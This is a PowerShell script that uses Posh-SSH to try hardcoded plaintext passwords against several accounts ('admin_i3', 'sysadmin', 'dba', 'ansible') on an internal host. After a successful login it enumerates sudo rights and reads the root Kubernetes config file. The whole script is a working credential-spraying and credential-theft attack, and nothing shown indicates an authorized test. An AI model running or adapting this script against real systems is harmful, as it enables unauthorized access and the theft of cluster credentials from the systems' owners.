Import-Module Posh-SSH
$pw1 = ConvertTo-SecureString 'iNMJFd3@' -AsPlainText -Force
$cred1 = New-Object System.Management.Automation.PSCredential("admin_i3",$pw1)
try {
    $s = New-SSHSession -ComputerName 10.9.101.3 -Credential $cred1 -AcceptKey -ErrorAction Stop -ConnectionTimeout 5
    Write-Host "CONNECTED:admin_i3:iNMJFd3@"
    $r = Invoke-SSHCommand -SSHSession $s -Command "id; sudo -l 2>&1; sudo cat /root/.kube/config 2>&1"
    Write-Host $r.Output
    Remove-SSHSession $s | Out-Null
} catch {
    Write-Host ("ERR1:admin_i3:iNMJFd3@ -> "+$_)
}

$pw2 = ConvertTo-SecureString 'ElJ4I$xX' -AsPlainText -Force
$cred2 = New-Object System.Management.Automation.PSCredential("admin_i3",$pw2)
try {
    $s2 = New-SSHSession -ComputerName 10.9.101.3 -Credential $cred2 -AcceptKey -ErrorAction Stop -ConnectionTimeout 5
    Write-Host "CONNECTED:admin_i3:ElJ4IxX"
    $r2 = Invoke-SSHCommand -SSHSession $s2 -Command "id"
    Write-Host $r2.Output
    Remove-SSHSession $s2 | Out-Null
} catch {
    Write-Host ("ERR2:admin_i3:ElJ4IxX -> "+$_)
}

# Try sysadmin and dba with same passwords
foreach ($user in @("sysadmin","dba","ansible")) {
    foreach ($pass in @("iNMJFd3@","ElJ4I`$xX","4d1n52007","S@mb@rcg1s")) {
        $p = ConvertTo-SecureString $pass -AsPlainText -Force
        $cr = New-Object System.Management.Automation.PSCredential($user,$p)
        try {
            $ss = New-SSHSession -ComputerName 10.9.101.3 -Credential $cr -AcceptKey -ErrorAction Stop -ConnectionTimeout 3
            Write-Host ("FOUND:$user`:$pass")
            $rr = Invoke-SSHCommand -SSHSession $ss -Command "id; sudo -l 2>&1"
            Write-Host $rr.Output
            Remove-SSHSession $ss | Out-Null
            break
        } catch {}
    }
}
